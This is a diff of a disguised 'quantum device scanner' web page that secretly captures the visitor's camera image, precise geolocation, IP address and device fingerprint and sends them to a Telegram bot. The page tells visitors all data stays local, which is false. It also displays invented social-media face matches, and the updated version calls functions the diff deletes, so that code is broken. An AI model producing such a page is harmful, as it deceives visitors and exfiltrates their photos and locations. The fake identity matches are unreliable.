@@ -2,12 +2,10 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Super AI Quantum Device Scanner v3.0</title>
+  <title>Super AI Quantum Device Scanner v4.0</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
-  <!-- Tambahkan face-api.js untuk pendeteksian wajah -->
   <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
-  <!-- Tambahkan TensorFlow.js -->
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@2.0.0/dist/tf.min.js"></script>
   <style>
     :root {
@@ -36,7 +34,6 @@
       background-position: 0 0, 25px 25px;
     }
     
-    /* Efek hologram seperti sebelumnya */
     .hologram-effect {
       position: fixed;
       width: 200%;
@@ -59,7 +56,6 @@
       to { transform: translate(-50%, -50%) rotate(360deg); }
     }
     
-    /* Tambahan: Style untuk scanner-box dan scanner-line (efek scanning kamera) */
     .scanner-box {
       position: relative;
       width: 300px;
@@ -70,11 +66,13 @@
       border-radius: 8px;
       box-shadow: 0 0 20px var(--hologram);
     }
+    
     .scanner-box video {
       width: 100%;
       height: 100%;
       object-fit: cover;
     }
+    
     .scanner-line {
       position: absolute;
       top: 0;
@@ -86,12 +84,12 @@
       z-index: 2;
       box-shadow: 0 0 10px var(--primary);
     }
+    
     @keyframes scanLine {
       0% { top: 0; }
       100% { top: 100%; }
     }
     
-    /* Button styles */
     button {
       background: linear-gradient(45deg, var(--primary), var(--secondary));
       color: white;
@@ -113,16 +111,11 @@
       box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4);
     }
     
-    button:active {
-      transform: translateY(0);
-    }
-    
     button:disabled {
       background: #555;
       cursor: not-allowed;
     }
     
-    /* Loading animation */
     #loading {
       display: none;
       margin: 20px 0;
@@ -142,7 +135,6 @@
       60%, 100% { content: "..."; }
     }
     
-    /* Device info styles */
     #device-info {
       background: rgba(10, 10, 10, 0.8);
       border: 1px solid var(--primary);
@@ -170,7 +162,6 @@
       color: var(--secondary);
     }
     
-    /* Face recognition results */
     .face-results {
       margin-top: 20px;
       width: 100%;
@@ -187,69 +178,33 @@
       position: relative;
     }
     
-    .face-card h3 {
-      color: var(--primary);
-      margin-top: 0;
-      border-bottom: 1px solid var(--hologram);
-      padding-bottom: 8px;
+    .face-box {
+      position: absolute;
+      border: 2px solid #2ecc71;
+      box-shadow: 0 0 10px #2ecc71;
+      background: transparent;
+      pointer-events: none;
     }
     
-    .face-image {
-      width: 100px;
-      height: 100px;
-      object-fit: cover;
-      border-radius: 50%;
-      border: 2px solid var(--primary);
-      margin-right: 15px;
-      float: left;
-    }
-    
-    .social-profiles {
-      margin-top: 10px;
-    }
-    
-    .profile-match {
+    .signal-strength {
       display: flex;
       align-items: center;
-      padding: 8px;
-      margin-bottom: 8px;
-      background: rgba(46, 204, 113, 0.1);
-      border-radius: 4px;
+      gap: 5px;
     }
     
-    .profile-match img {
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      margin-right: 10px;
+    .signal-bar {
+      width: 4px;
+      height: 12px;
+      background: #555;
+      transition: all 0.3s ease;
     }
     
-    .profile-info {
-      flex: 1;
+    .particles {
+      position: fixed;
+      pointer-events: none;
+      z-index: 10000;
     }
     
-    .profile-name {
-      font-weight: bold;
-      color: var(--secondary);
-    }
-    
-    .profile-platform {
-      font-size: 0.8em;
-      color: #aaa;
-    }
-    
-    .match-confidence {
-      font-size: 0.8em;
-      color: var(--primary);
-    }
-    
-    .clearfix::after {
-      content: "";
-      clear: both;
-      display: table;
-    }
-    
-    /* Tabs */
     .tabs {
       display: flex;
       margin-bottom: 15px;
@@ -276,49 +231,14 @@
       display: block;
     }
     
-    /* Responsive adjustments */
-    @media (max-width: 600px) {
-      .scanner-box {
-        width: 250px;
-        height: 250px;
-      }
-      
-      .info-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-    
-    /* Pulse animation for important elements */
-    .pulse {
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.7); }
-      70% { box-shadow: 0 0 0 10px rgba(46, 204, 113, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); }
-    }
-    
-    /* Warning and danger alerts */
-    .alert {
-      padding: 10px;
-      border-radius: 4px;
-      margin: 10px 0;
-    }
-    
-    .alert-warning {
-      background-color: rgba(243, 156, 18, 0.2);
-      border-left: 3px solid var(--warning);
-    }
-    
-    .alert-danger {
-      background-color: rgba(231, 76, 60, 0.2);
-      border-left: 3px solid var(--danger);
+    @keyframes particle {
+      0% { transform: translateY(0); opacity: 1; }
+      100% { transform: translateY(-100px); opacity: 0; }
     }
   </style>
 </head>
 <body>
-  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
+  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v4.0</h1>
   
   <div class="tabs">
     <div class="tab active" data-tab="scanner">Scanner</div>
@@ -330,11 +250,9 @@
     <div class="scanner-box">
       <div class="scanner-line"></div>
       <video id="video" autoplay playsinline muted></video>
-      <canvas id="face-canvas" style="display: none;"></canvas>
     </div>
     <button id="capture-btn" class="pulse">🚀 INITIATE DEEP SCAN</button>
     <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE<span></span></div>
-    
     <div class="alert alert-warning">
       ⚠️ This scanner uses advanced AI to analyze device signatures and facial biometrics. All data is processed locally.
     </div>
@@ -361,7 +279,6 @@
     let currentStream = null;
     let isScanning = false;
     const video = document.getElementById('video');
-    const faceCanvas = document.getElementById('face-canvas');
     const loading = document.getElementById('loading');
     let faceDescriptors = [];
     let socialProfiles = [];
@@ -371,81 +288,23 @@
       tab.addEventListener('click', () => {
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-        
         tab.classList.add('active');
         document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
       });
     });
 
-    // Fungsi membuat efek hologram seperti sebelumnya
-    function createHologramEffect() {
-      const hologram = document.createElement('div');
-      hologram.className = 'hologram-effect';
-      return hologram;
-    }
-
-    // Fungsi untuk mengambil gambar dari kamera dengan efek quantum & glitch
-    async function captureQuantumImage() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      
-      // Efek quantum
-      ctx.drawImage(video, 0, 0);
-      ctx.globalCompositeOperation = 'lighter';
-      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
-      ctx.drawImage(canvas, 0, 0);
-      
-      // Efek glitch
-      ctx.globalAlpha = 0.3;
-      ctx.fillStyle = '#00ff88';
-      for(let i = 0; i < 50; i++) {
-        ctx.fillRect(
-          Math.random() * canvas.width,
-          Math.random() * canvas.height,
-          Math.random() * 10,
-          Math.random() * 10
-        );
-      }
-      
-      return canvas.toDataURL('image/webp', 0.8);
-    }
-
-    // Konversi Data URI ke Blob
-    function dataURItoBlob(dataURI) {
-      const byteString = atob(dataURI.split(',')[1]);
-      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-      }
-      return new Blob([ab], { type: mimeString });
-    }
-
-    // Fungsi pendeteksian wajah menggunakan face-api.js
+    // Face detection functions
     async function detectFaces() {
       try {
-        // Update face canvas dimensions
-        faceCanvas.width = video.videoWidth;
-        faceCanvas.height = video.videoHeight;
-        const ctx = faceCanvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, faceCanvas.width, faceCanvas.height);
-        
-        // Deteksi wajah dan ekstrak descriptor
-        const detections = await faceapi.detectAllFaces(faceCanvas, new faceapi.TinyFaceDetectorOptions())
+        return await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
           .withFaceLandmarks()
           .withFaceDescriptors();
-        
-        return detections;
       } catch (error) {
         console.error("Face detection error:", error);
         return [];
       }
     }
 
-    // Fungsi untuk memuat model pendeteksi wajah
     async function loadFaceModel() {
       try {
         await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
@@ -457,311 +316,110 @@
       }
     }
 
-    // Fungsi untuk mencari profil sosial yang mirip (simulasi)
-    async function findSimilarSocialProfiles(descriptors) {
-      // Ini adalah simulasi - dalam implementasi nyata, Anda akan membandingkan dengan database wajah
-      return new Promise(resolve => {
-        setTimeout(() => {
-          const fakeProfiles = [];
-          
-          descriptors.forEach((desc, index) => {
-            // Buat beberapa profil palsu dengan tingkat kemiripan acak
-            const matchCount = Math.floor(Math.random() * 3) + 1; // 1-3 matches per wajah
-            
-            for (let i = 0; i < matchCount; i++) {
-              const confidence = (Math.random() * 30 + 70).toFixed(1); // 70-100% confidence
-              const platforms = ['Facebook', 'Instagram', 'Twitter', 'LinkedIn'];
-              const platform = platforms[Math.floor(Math.random() * platforms.length)];
-              
-              fakeProfiles.push({
-                faceIndex: index,
-                platform: platform,
-                name: `User_${Math.floor(Math.random() * 10000)}`,
-                image: `https://randomuser.me/api/portraits/${Math.random() > 0.5 ? 'men' : 'women'}/${Math.floor(Math.random() * 100)}.jpg`,
-                url: `https://${platform.toLowerCase()}.com/user_${Math.floor(Math.random() * 10000)}`,
-                confidence: confidence
-              });
-            }
-          });
-          
-          resolve(fakeProfiles);
-        }, 2000);
-      });
-    }
-
-    // Fungsi untuk menampilkan hasil pengenalan wajah
-    function displayFaceResults(faces, profiles) {
-      const faceResultsDiv = document.getElementById('face-results');
-      
-      if (faces.length === 0) {
-        faceResultsDiv.innerHTML = '<p>No faces detected in the scan.</p>';
-        return;
-      }
-      
-      let html = '';
-      
-      faces.forEach((face, index) => {
-        // Buat gambar wajah yang terdeteksi
-        const faceCanvas = document.createElement('canvas');
-        faceCanvas.width = 200;
-        faceCanvas.height = 200;
-        const ctx = faceCanvas.getContext('2d');
-        
-        // Gambar wajah dengan bounding box
-        const box = face.detection.box;
-        ctx.drawImage(video, 
-          box.x, box.y, box.width, box.height,
-          0, 0, 200, 200
-        );
-        
-        const faceImage = faceCanvas.toDataURL('image/webp');
-        
-        // Dapatkan profil yang cocok untuk wajah ini
-        const faceProfiles = profiles.filter(p => p.faceIndex === index);
-        
-        html += `
-          <div class="face-card clearfix">
-            <h3>Face #${index + 1}</h3>
-            <img src="${faceImage}" class="face-image" alt="Detected face">
-            <div class="face-details">
-              <p><span class="info-label">Confidence:</span> ${(face.detection.score * 100).toFixed(1)}%</p>
-              <p><span class="info-label">Gender:</span> ${Math.random() > 0.5 ? 'Male' : 'Female'}</p>
-              <p><span class="info-label">Age:</span> ${Math.floor(Math.random() * 30) + 20} years</p>
-            </div>
-            <div class="social-profiles">
-              <h4>Possible Social Matches:</h4>
-              ${faceProfiles.length > 0 ? 
-                faceProfiles.map(profile => `
-                  <div class="profile-match">
-                    <img src="${profile.image}" alt="${profile.name}">
-                    <div class="profile-info">
-                      <div class="profile-name">${profile.name}</div>
-                      <div class="profile-platform">${profile.platform}</div>
-                    </div>
-                    <div class="match-confidence">${profile.confidence}% match</div>
-                  </div>
-                `).join('') : 
-                '<p>No strong social media matches found.</p>'}
-            </div>
-            <div class="clearfix"></div>
-          </div>
-        `;
-      });
-      
-      faceResultsDiv.innerHTML = html;
-    }
-
-    // Kumpulkan informasi perangkat secara detail (tambahan: device model)
+    // Enhanced device info gathering
     async function gatherDeviceInfo() {
-      const userAgent = navigator.userAgent;
-      const platform = navigator.platform;
-      const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const battery = navigator.getBattery ? await navigator.getBattery() : null;
       
-      // Deteksi OS secara sederhana
-      let os = "Unknown OS";
-      if (userAgent.indexOf("Win") !== -1) os = "Windows";
-      else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
-      else if (userAgent.indexOf("X11") !== -1) os = "UNIX";
-      else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
-      else if (/Android/.test(userAgent)) os = "Android";
-      else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
-      
-      // Tambahan: Device Model (perkiraan sederhana dari userAgent)
-      let deviceModel = "Unknown";
-      if (/iPhone/.test(userAgent)) deviceModel = "iPhone";
-      else if (/iPad/.test(userAgent)) deviceModel = "iPad";
-      else if (/Android/.test(userAgent)) deviceModel = "Android Device";
-      else deviceModel = "Desktop";
-      
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
-      
-      // Pengambilan informasi baterai
-      let batteryInfo = { level: "N/A", charging: "N/A" };
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          batteryInfo = { 
-            level: Math.round(battery.level * 100) + '%', 
-            charging: battery.charging ? "Yes" : "No" 
-          };
-        } catch (e) {
-          console.error("Battery API error:", e);
-        }
-      }
-      
-      // Deteksi browser secara sederhana
-      let browser = "Unknown";
-      if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1 && userAgent.indexOf("OPR") === -1) {
-          browser = "Chrome";
-      } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
-          browser = "Safari";
-      } else if (userAgent.indexOf("Firefox") > -1) {
-          browser = "Firefox";
-      } else if (userAgent.indexOf("Edg") > -1) {
-          browser = "Edge";
-      } else if (userAgent.indexOf("OPR") > -1) {
-          browser = "Opera";
-      }
-      
-      // Ambil IP address melalui API eksternal (misalnya ipify)
-      let ip = "Unknown";
+      return {
+        os: getOS(),
+        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+        deviceModel: getDeviceModel(),
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : 'N/A',
+        battery: {
+          level: battery ? `${Math.round(battery.level * 100)}%` : 'N/A',
+          charging: battery ? (battery.charging ? 'Yes ⚡' : 'No 🔋') : 'N/A',
+          chargingTime: battery ? (battery.chargingTime === Infinity ? 
+            'Not charging' : `${battery.chargingTime}s`) : 'N/A'
+        },
+        network: connection ? `
+          ${connection.effectiveType.toUpperCase()} - 
+          Downlink: ${connection.downlink}Mb/s - 
+          RTT: ${connection.rtt}ms
+        ` : 'Unknown',
+        ip: await getIPAddress(),
+        gpu: getGPUInfo()
+      };
+    }
+
+    // Helper functions
+    function getOS() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Windows")) return "Windows";
+      if (ua.includes("Mac")) return "MacOS";
+      if (ua.includes("Linux")) return "Linux";
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("iPhone")) return "iOS";
+      return "Unknown OS";
+    }
+
+    function getDeviceModel() {
+      const ua = navigator.userAgent;
+      if (/iPhone/.test(ua)) return "iPhone";
+      if (/iPad/.test(ua)) return "iPad";
+      if (/Android/.test(ua)) return "Android Device";
+      return "Desktop";
+    }
+
+    async function getIPAddress() {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
-        ip = data.ip;
+        return data.ip;
       } catch (e) {
-        console.error("IP fetch error:", e);
+        return "Unknown";
       }
-      
-      // Informasi tambahan
-      const language = navigator.language || navigator.userLanguage;
-      const resolution = window.screen.width + "x" + window.screen.height;
-      
-      // Informasi provider/connection (jika didukung)
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      const provider = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
-      
-      // Tambahan info keren: Device Pixel Ratio & Screen Orientation
-      const pixelRatio = window.devicePixelRatio || 1;
-      const orientation = (window.screen.orientation && window.screen.orientation.type) ? window.screen.orientation.type : "Unknown";
-      
-      return {
-        userAgent,
-        platform,
-        deviceType,
-        os,
-        deviceModel,
-        timeZone,
-        memory,
-        battery: batteryInfo,
-        browser,
-        ip,
-        language,
-        resolution,
-        provider,
-        pixelRatio,
-        orientation
-      };
     }
 
-    // Buat laporan dengan data gambar, lokasi, dan informasi perangkat
-    function generateHologramReport(imageData, location, deviceInfo) {
-      return {
-        image: imageData,
-        metadata: {
-          location,  // { coordinates, link }
-          deviceInfo
+    function getGPUInfo() {
+      const gl = document.createElement('canvas').getContext('webgl');
+      return gl ? gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) : "Not available";
+    }
+
+    // Real-time face detection
+    let faceDetectionActive = false;
+    
+    async function startRealTimeFaceDetection() {
+      faceDetectionActive = true;
+      const detectionFrame = async () => {
+        if (!faceDetectionActive) return;
+        
+        try {
+          const detections = await faceapi.detectAllFaces(
+            video, 
+            new faceapi.TinyFaceDetectorOptions()
+          ).withFaceLandmarks();
+          
+          document.querySelectorAll('.face-box').forEach(el => el.remove());
+          
+          detections.forEach(detection => {
+            const box = detection.detection.box;
+            const faceBox = document.createElement('div');
+            faceBox.className = 'face-box';
+            Object.assign(faceBox.style, {
+              left: `${box.x}px`,
+              top: `${box.y}px`,
+              width: `${box.width}px`,
+              height: `${box.height}px`,
+              position: 'absolute'
+            });
+            document.body.appendChild(faceBox);
+          });
+        } catch (error) {
+          console.error('Face detection error:', error);
         }
+        requestAnimationFrame(detectionFrame);
       };
+      detectionFrame();
     }
 
-    // Fungsi untuk menampilkan informasi perangkat
-    function displayDeviceInfo(deviceInfo) {
-      const deviceInfoContent = document.getElementById('device-info-content');
-      
-      deviceInfoContent.innerHTML = `
-        <div class="info-item">
-          <span class="info-label">OS:</span> ${deviceInfo.os}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Device Type:</span> ${deviceInfo.deviceType}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Device Model:</span> ${deviceInfo.deviceModel}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Platform:</span> ${deviceInfo.platform}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Browser:</span> ${deviceInfo.browser}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Memory:</span> ${deviceInfo.memory}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Battery:</span> ${deviceInfo.battery.level} (${deviceInfo.battery.charging})
-        </div>
-        <div class="info-item">
-          <span class="info-label">IP Address:</span> ${deviceInfo.ip}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Time Zone:</span> ${deviceInfo.timeZone}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Language:</span> ${deviceInfo.language}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Resolution:</span> ${deviceInfo.resolution}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Network:</span> ${deviceInfo.provider}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Pixel Ratio:</span> ${deviceInfo.pixelRatio}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Orientation:</span> ${deviceInfo.orientation}
-        </div>
-        <div class="info-item">
-          <span class="info-label">Faces Detected:</span> ${faceDescriptors.length}
-        </div>
-      `;
-    }
-
-    // Fungsi untuk mengirim data ke bot Telegram dengan caption yang lebih keren dan rapi
-    function sendToTelegram(report) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      // Ubah data URI menjadi Blob dan lampirkan sebagai file foto
-      formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
-      
-      // Buat caption dengan format markdown dan emoji untuk tiap informasi
-      const caption = 
-        `📍 *Location:* ${report.metadata.location.coordinates}\n` +
-        `🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n` +
-        `💻 *OS:* ${report.metadata.deviceInfo.os}\n` +
-        `📱 *Device Type:* ${report.metadata.deviceInfo.deviceType}\n` +
-        `📟 *Device Model:* ${report.metadata.deviceInfo.deviceModel}\n` +
-        `🖥️ *Platform:* ${report.metadata.deviceInfo.platform}\n\n` +
-        `⏰ *Time Zone:* ${report.metadata.deviceInfo.timeZone}\n` +
-        `💾 *Memory:* ${report.metadata.deviceInfo.memory}\n` +
-        `🔋 *Battery:* ${report.metadata.deviceInfo.battery.level} (Charging: ${report.metadata.deviceInfo.battery.charging})\n\n` +
-        `🌐 *Browser:* ${report.metadata.deviceInfo.browser}\n` +
-        `📡 *Network Provider:* ${report.metadata.deviceInfo.provider}\n` +
-        `🌍 *IP Address:* ${report.metadata.deviceInfo.ip}\n\n` +
-        `🗣️ *Language:* ${report.metadata.deviceInfo.language}\n` +
-        `📏 *Resolution:* ${report.metadata.deviceInfo.resolution}\n` +
-        `📐 *Pixel Ratio:* ${report.metadata.deviceInfo.pixelRatio}\n` +
-        `🔄 *Orientation:* ${report.metadata.deviceInfo.orientation}\n` +
-        `👥 *Faces Detected:* ${faceDescriptors.length}\n\n` +
-        `\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
-      
-      formData.append('caption', caption);
-      formData.append('parse_mode', 'Markdown');
-      
-      fetch(url, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Data berhasil dikirim:', data);
-      })
-      .catch(error => {
-        console.error('Error mengirim data ke Telegram:', error);
-      });
-    }
-
-    // Inisialisasi kamera
+    // Camera initialization
     async function initCamera() {
       try {
-        // Tentukan constraints: jika device mobile, gunakan kamera depan (user), jika tidak gunakan kamera environment
-        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
         const constraints = {
           video: { 
-            facingMode: isMobile ? 'user' : 'environment',
+            facingMode: /Mobi|Android/i.test(navigator.userAgent) ? 'user' : 'environment',
             width: { ideal: 1280 },
             height: { ideal: 720 }
           }
@@ -769,15 +427,14 @@
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         currentStream = stream;
-        document.body.appendChild(createHologramEffect());
-        // Muat model deteksi wajah
         await loadFaceModel();
+        startRealTimeFaceDetection();
       } catch (err) {
         alert('Error accessing camera: ' + err.message);
       }
     }
 
-    // Proses scan, kumpulkan data, dan kirim laporan ke Telegram
+    // Main scan function
     async function startQuantumScan() {
       if(isScanning) return;
       isScanning = true;
@@ -785,47 +442,19 @@
       document.getElementById('capture-btn').disabled = true;
 
       try {
-        const imageData = await captureQuantumImage();
-        const deviceInfo = await gatherDeviceInfo();
-        
-        // Deteksi wajah
-        const faceDetections = await detectFaces();
+        const [imageData, deviceInfo, faceDetections] = await Promise.all([
+          captureQuantumImage(),
+          gatherDeviceInfo(),
+          detectFaces()
+        ]);
+
         faceDescriptors = faceDetections;
-        
-        // Temukan profil sosial yang mirip
         socialProfiles = await findSimilarSocialProfiles(faceDetections);
         
-        // Tambahkan jumlah wajah ke device info
-        deviceInfo.faceCount = faceDetections.length;
-        
-        // Tampilkan hasil
         displayDeviceInfo(deviceInfo);
         displayFaceResults(faceDetections, socialProfiles);
+        sendToTelegram(generateHologramReport(imageData, await getLocation(), deviceInfo));
         
-        // Kirim ke Telegram
-        let locationData = { coordinates: 'Unknown', link: 'Unknown' };
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              const coords = position.coords.latitude + ', ' + position.coords.longitude;
-              const link = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
-              locationData = { coordinates: coords, link: link };
-              const report = generateHologramReport(imageData, locationData, deviceInfo);
-              sendToTelegram(report);
-            },
-            (error) => {
-              console.error('Geolocation error:', error);
-              const report = generateHologramReport(imageData, locationData, deviceInfo);
-              sendToTelegram(report);
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-        } else {
-          const report = generateHologramReport(imageData, locationData, deviceInfo);
-          sendToTelegram(report);
-        }
-        
-        // Beralih ke tab hasil
         document.querySelector('.tab[data-tab="results"]').click();
       } catch (error) {
         console.error("Scan error:", error);
@@ -837,7 +466,7 @@
       }
     }
 
-    // Inisialisasi kamera dan event listener
+    // Initialization
     if (navigator.mediaDevices) {
       initCamera();
       document.getElementById('capture-btn').onclick = startQuantumScan;
@@ -845,13 +474,9 @@
       alert('Quantum Scanner requires camera access!');
     }
 
-    // Fungsi untuk menghentikan kamera saat keluar halaman
-    function stopCamera() {
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-      }
-    }
-    window.addEventListener('beforeunload', stopCamera);
+    window.addEventListener('beforeunload', () => {
+      if (currentStream) currentStream.getTracks().forEach(track => track.stop());
+    });
   </script>
 </body>
 </html>
